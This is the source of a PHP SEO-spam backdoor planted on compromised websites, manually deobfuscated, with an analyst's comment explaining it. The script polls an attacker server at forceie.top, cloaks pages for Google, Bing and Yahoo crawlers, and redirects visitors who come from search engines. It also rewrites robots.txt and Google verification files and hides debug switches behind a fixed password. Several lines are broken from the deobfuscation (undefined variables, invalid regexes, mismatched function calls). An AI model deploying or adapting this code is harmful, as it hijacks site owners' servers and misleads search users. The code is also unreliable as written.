<?php
// manually deobfuscated, so the variable names probably don't exactly match what they were originally, also i have not fully analyzed it, so not all variables were renamed,
// however the script should still be sufficiently understandable

// this script returns fake sitemaps which redirect to other sites, this helps getting spam to rank higher on google etc by hijacking highly ranked websites.

error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
date_default_timezone_set("PRC");

$backend = 'fr003xy';

$document_root = @$_SERVER["DOCUMENT_ROOT"];
$request_uri = @$_SERVER["REQUEST_URI"];
$script_name = @basename(__FILE__);
$hostname = @$_SERVER["HTTP_HOST"];
$language = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];

$user_agent = @$_SERVER["HTTP_USER_AGENT"];
$referer = @$_SERVER["HTTP_REFERER"];
$protocol = ((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") || (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https")) ? "https://" : "http://";
$base_url = $protocol . $hostname;
$user_agent = @strtolower($user_agent);
$referer = @strtolower($referer);

if (getenv("HTTP_CLIENT_IP")) {
    $client_ip = getenv("HTTP_CLIENT_IP");
} elseif (getenv("HTTP_X_FORWARDED_FOR")) {
    $client_ip = getenv("HTTP_X_FORWARDED_FOR");
} elseif (getenv("REMOTE_ADDR")) {
    $client_ip = getenv("REMOTE_ADDR");
} else {
    $client_ip = $_SERVER["REMOTE_ADDR"];
}

if (isset($_GET["vf"]) && $_GET["vf"] == "online5566") {
    echo "domain online*";
    exit;
}

$request_directory = dirname($request_uri);
if (strstr($request_uri, "sitemap_index_")) {
    sitemap_index(
        $backend,
        $base_url,
        $request_uri,
        $hostname,
        $protocol,
        $request_directory,
        $script_name
    );
}
if (strstr($request_uri, ".xml")) {
    sitemap(
        $backend,
        $base_url,
        $request_uri,
        $protocol,
        $hostname,
        $client_ip,
        $request_directory,
        $script_name
    );
}

function sitemap_index($backend, $base_url, $request_uri, $hostname, $protocol, $request_directory, $script_name)
{
    $api_url = "http://" . $backend
        . ".forceie.top/Api/siteAllMap.php?page=" . $request_uri
        . "&pwd=sl123&domain=" . $base_url . "&cur=" . $script_name;
    if (isset($_GET["vf_allmap"]) && $_GET["vf_allmap"] == "online5566") {
        echo $api_url;
        exit;
    }
    $response = json_decode(request($api_url), true);
    if (empty($response) || $response["code"] == 404) {
        header("HTTP/1.0 404 Not Found");
        header("Status: 404 Not Found");
        exit();
    }
    if (empty($response) || $response["code"] == 444) {
        header("HTTP/1.0 404 Not Found");
        header("Status: 404 Not Found");
        exit();
    }
    $data = $response["data"];
    header("Content-type:text/xml");
    echo $data;
    exit();
}

function sitemap($backend, $base_url, $request_uri, $protocol, $hostname, $client_ip, $request_directory = '', $script_name = '')
{
    $api_url = "http://" . $backend
        . ".forceie.top/Api/siteUrlApi.php?stype=sitemap&num=6000&pr=" . $request_directory . "&url=" . $request_uri
        . "&domain=" . $base_url . "&ip=" . $client_ip . "&cur=" . $script_name;
    if (isset($_GET["vf_map"]) && $_GET["vf_map"] == "online5566") {
        echo $api_url;
        exit;
    }
    $response = json_decode(request($api_url), true);
    if (isset($response["code"]) && $response["code"] == "600") {
        $data = $response["data"];
        foreach ($data as $Oog => $Oov) {
            $o0o0oooo = request($Oov);
            $Oooo0s = (strpos($o0o0oooo, "Sitemap Notification Received") !== false) ? "OK" : "ERROR";
            echo $Oov . "===>Submitting Google Sitemap: " . $Oooo0s . PHP_EOL;
        }
        exit();
    }
    if (isset($response["code"]) && $response["code"] == "406") {
        echo "Submitting Google Sitemap Return Fail";
        exit();
    }
    if (empty($response) || $response["code"] == 404) {
        header("HTTP/1.0 404 Not Found");
        header("Status: 404 Not Found");
        exit();
    }
    $data = $response["data"];
    header("Content-type:text/xml");
    echo $data;
    exit();
}
if (isset($_GET["google"])) {
    $OoOO = $_GET["google"];
    if (preg_match("/^google.|?(\\.html)$/i", $OoOO)) {
        if (write_file($O, $OoOO, "google-site-verification:" . ' ' . $OoOO)) {
            exit("<a href=" . $OoOO . ">" . $OoOO . "</a>");
        } else {
            exit("fail****");
        }
    }
}
if (isset($_GET["robots"])) {
    $both = '';
    $o0o0o = $_GET["robots"];
    $api_url = "http://" . $backend
        . ".forceie.top/Api/rob.php?rob=" . $o0o0o . "&pwd=sl123&domain=" . $base_url . "&cur=" . $script_name;
    if ($o0o0o == "online5566") {
        echo $api_url;
        exit;
    }
    $response = json_decode(request($O, $api_url), true);
    if (empty($response) || $response["code"] == 404) {
        header("HTTP/1.0 404 Not Found");
        header("Status: 404 Not Found");
        exit();
    }
    $data = $response["data"];
    if (write_file($O, "robots.txt", $data)) {
        echo $data;
        exit();
    } else {
        exit("fail***");
    }
}
if (preg_match("/yahoo(?*\\.co\\.jp)" . $O[90] . "google(?*\\.co\\.jp)" . $O[90] . "bing/i", $referer)) {
    if (isset($_GET["vf_jump"]) && $_GET["vf_jump"] == "online5566") {
        echo "http://" . $backend
            . ".forceie.top/jump.php?domain=" . $hostname . "&page=" . $request_uri
            . "&bot=0&pr=" . $request_directory . "&refer=" . $referer . "&ip=" . $client_ip . "&lg=" . $language . "&cur=" . $script_name;
        exit;
    }
    $o0o0ooo = request($O, "http://" . $backend
        . ".forceie.top/jump.php?domain=" . $hostname . "&page=" . $request_uri
        . "&bot=0&pr=" . $request_directory . "&refer=" . $referer . "&ip=" . $client_ip . "&lg=" . $language . "&cur=" . $script_name);
    if ($o0o0ooo) {
        echo $o0o0ooo;
        exit();
    }
}
if (stristr($user_agent, "googlebot") || stristr($user_agent, "bing") || stristr($user_agent, "Y*J") || stristr($user_agent, "y*j") || stristr($user_agent, "yahoo") || stristr($user_agent, "google") || stristr($user_agent, "Googlebot") || stristr($user_agent, "googlebot")) {
    if (isset($_GET["vf_bot"]) && $_GET["vf_bot"] == "online5566") {
        echo "http://" . $backend
            . ".forceie.top/918.php?domain=" . $hostname . "&page=" . $request_uri
            . "&bot=1&pr=" . $request_directory . "&ip=" . $client_ip . "&lg=" . $language . "&cur=" . $script_name;
        exit;
    }
    $result = request($O, "http://" . $backend
        . ".forceie.top/918.php?domain=" . $hostname . "&page=" . $request_uri
        . "&bot=1&pr=" . $request_directory . "&ip=" . $client_ip . "&lg=" . $language . "&cur=" . $script_name);
    if (!empty($result)) {
        $response = json_decode($result, true);
        if ($response["code"] == 404) {
            header("HTTP/1.0 404 Not Found");
            header("Status: 404 Not Found");
            exit();
        }
        if ($response["code"] == 500) {
            header("HTTP/1.1 500 Internal Server Error");
            exit();
        }
        echo $result;
        exit;
    }
}
if (isset($_GET["vf_origin"]) && $_GET["vf_origin"] == "online5566") {
    echo "http://" . $backend
        . ".forceie.top/org.php?domain=" . $hostname . "&page=" . $request_uri
        . "&pr=" . $request_directory . "&ip=" . $client_ip . "&lg=" . $language . "&cur=" . $script_name;
    exit;
}

request("http://" . $backend . ".forceie.top/org.php?domain=" . $hostname . "&page=" . $request_uri . "&pr=" . $request_directory . "&ip=" . $client_ip . "&lg=" . $language . "&cur=" . $script_name);

function request($url)
{
    $result = '';
    $user_agent = "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)";
    if (function_exists("curl_init")) {
        try {
            $curl_handle = curl_init();
            curl_setopt($curl_handle, CURLOPT_URL, $url);
            curl_setopt($curl_handle, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, 30);
            $result = curl_exec($curl_handle);
            curl_close($curl_handle);
        } catch (Exception $e) {
        }
    }
    if (strlen($result) < 1 && function_exists("file_get_contents")) {
        ini_set("user_agent", $user_agent);
        try {
            $result = @file_get_contents($url);
        } catch (Exception $e) {
        }
    }
    return $result;
}
function write_file($filename, $data)
{
    $fp = fopen($filename, "w") or die('0');
    $result = fwrite($fp, $data);
    fclose($fp);
    return $result;
}
